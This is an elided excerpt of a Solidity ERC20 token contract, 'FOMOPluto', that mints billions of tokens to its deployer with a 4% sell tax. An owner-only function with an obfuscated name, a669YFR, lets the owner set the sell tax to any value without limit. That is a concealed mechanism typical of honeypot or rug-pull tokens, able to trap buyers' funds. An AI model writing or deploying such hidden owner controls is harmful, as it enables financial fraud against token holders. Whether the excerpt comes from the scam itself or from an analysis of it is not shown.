...
contract FOMOPluto is ERC20 {
    uint256 public sellTax;
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;
    constructor() ERC20("FOMOP", "FOMOPluto") {
        _mint(msg.sender, 51652414136 * (10 ** uint256(decimals())));
        sellTax = 4;
        _owner = msg.sender;
    }
    ...
    function a669YFR(uint256 amount) public onlyOwner {
        sellTax = amount;
    }
